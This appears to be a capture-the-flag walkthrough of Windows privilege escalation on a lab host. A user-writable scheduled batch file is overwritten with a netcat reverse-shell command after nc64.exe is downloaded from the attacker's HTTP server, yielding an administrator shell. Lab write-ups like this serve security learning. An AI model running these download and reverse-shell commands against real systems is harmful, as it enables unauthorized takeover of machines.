There is an interesting job.bat file

## Contents
```
PS C:\> cd .\Log-Management\
PS C:\Log-Management> ls


    Directory: C:\Log-Management


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2020   1:42 AM            346 job.bat


PS C:\Log-Management> type job.bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")       
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit

```

## Checking permissions
```
PS C:\Log-Management> icacls .\job.bat
.\job.bat BUILTIN\Users:(F)
          NT AUTHORITY\SYSTEM:(I)(F)
          BUILTIN\Administrators:(I)(F)
          BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

```

Users have Full control, which means daniel should be able to edit the file.

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil

It makes sense to overwrite the entire file with a netcat payload :)
## Uploading a netcat payload
Netcat is available here: https://github.com/int0x33/nc.exe/
```
┌──(kali㉿kali)-[~/Payloads/nc.exe]
└─$ python3 -m http.server 8000        
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

PS C:\Log-Management> curl http://10.10.14.103:8000/nc64.exe -o nc64.exe     
PS C:\Log-Management> ls


    Directory: C:\Log-Management


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2020   1:42 AM            346 job.bat
-a----        8/29/2025   5:32 AM          45272 nc64.exe

```

## Overwriting  job.bat 
Note that powershell cannot use the commands below, gotta be in a downgraded shell.

```
PS C:\Log-Management> echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.103
 1337 > .\job.bat
Write-Output : Parameter cannot be processed because the parameter name 'e'  
is ambiguous. Possible matches include: -ErrorAction -ErrorVariable.
At line:1 char:33
+ echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.103 1337 > .\job. ...  
+                                 ~~
    + CategoryInfo          : InvalidArgument: (:) [Write-Output], Paramete  
   rBindingException
    + FullyQualifiedErrorId : AmbiguousParameter,Microsoft.PowerShell.Comma  
   nds.WriteOutputCommand
 
PS C:\Log-Management> exit

daniel@MARKUP C:\Users\daniel>

daniel@MARKUP C:\Log-Management>echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.103 1337 > job.bat


```

## Listening for and catching a shell
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.103] from (UNKNOWN) [10.129.140.208] 49673
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

C:\Windows\system32>whoami
whoami
markup\administrator

```
